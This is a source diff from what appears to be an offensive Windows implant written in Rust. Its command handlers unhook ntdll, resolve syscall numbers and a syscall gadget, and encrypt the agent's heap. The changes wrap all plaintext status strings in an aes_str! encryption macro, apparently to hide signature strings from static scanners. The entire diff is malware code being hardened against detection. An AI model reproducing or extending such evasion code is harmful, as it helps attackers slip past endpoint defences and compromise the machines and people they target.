@@ -29,7 +29,7 @@ pub fn handle_patch_all() -> DispatchResult {
     }
     match crate::agent::evasion::unhook_ntdll() {
         Ok(msg) => results.push(format!("[+] {}", msg)),
-        Err(e) => results.push(format!("[-] Unhook: {}", e)),
+        Err(e) => results.push(format!("{}: {}", aes_str!("[-] Unhook"), e)),
     }
     DispatchResult::Reply(results.join("\n"), String::new(), 0, AgentAction::None)
 }
@@ -42,14 +42,14 @@ pub fn handle_syscall_check() -> DispatchResult {
     ];
     for name in &names {
         let ssn = unsafe { syscalls::win::get_syscall_number(name.as_str()) };
-        lines.push(format!("{}: {}", name, ssn.map(|n| format!("SSN 0x{:X}", n)).unwrap_or("NOT FOUND".into())));
+        lines.push(format!("{}: {}", name, ssn.map(|n| format!("{} 0x{:X}", aes_str!("SSN"), n)).unwrap_or_else(|| aes_str!("NOT FOUND"))));
     }
     let gadget = unsafe { syscalls::win::find_syscall_gadget() };
-    lines.push(format!("Syscall gadget: {}", gadget.map(|p| format!("0x{:X}", p as usize)).unwrap_or("NOT FOUND".into())));
+    lines.push(format!("{}: {}", aes_str!("Syscall gadget"), gadget.map(|p| format!("0x{:X}", p as usize)).unwrap_or_else(|| aes_str!("NOT FOUND"))));
 
     // Gap-2 diagnostic: report .text section location
     if let Some((base, size)) = crate::agent::evasion::agent_text_section() {
-        lines.push(format!(".text section:  base=0x{:X}  size={} bytes", base as usize, size));
+        lines.push(format!("{}  base=0x{:X}  size={} {}", aes_str!(".text section:"), base as usize, size, aes_str!("bytes")));
     } else {
         lines.push(aes_str!(".text section:  not found"));
     }
@@ -109,7 +109,7 @@ pub fn handle_encrypt_heap_aes() -> DispatchResult {
                 );
             }
             DispatchResult::Reply(
-                format!("[+] AES-256-GCM heap: {} blocks encrypted", n),
+                format!("{} {} {}", aes_str!("[+] AES-256-GCM heap:"), n, aes_str!("blocks encrypted")),
                 String::new(), 0, AgentAction::None,
             )
         }
@@ -150,7 +150,7 @@ pub fn handle_decrypt_heap_aes() -> DispatchResult {
 
     match result {
         Ok(n) => DispatchResult::Reply(
-            format!("[+] AES-256-GCM heap: {} blocks decrypted", n),
+            format!("{} {} {}", aes_str!("[+] AES-256-GCM heap:"), n, aes_str!("blocks decrypted")),
             String::new(), 0, AgentAction::None,
         ),
         Err(e) => DispatchResult::Reply(String::new(), format!("[-] {}", e), 1, AgentAction::None),
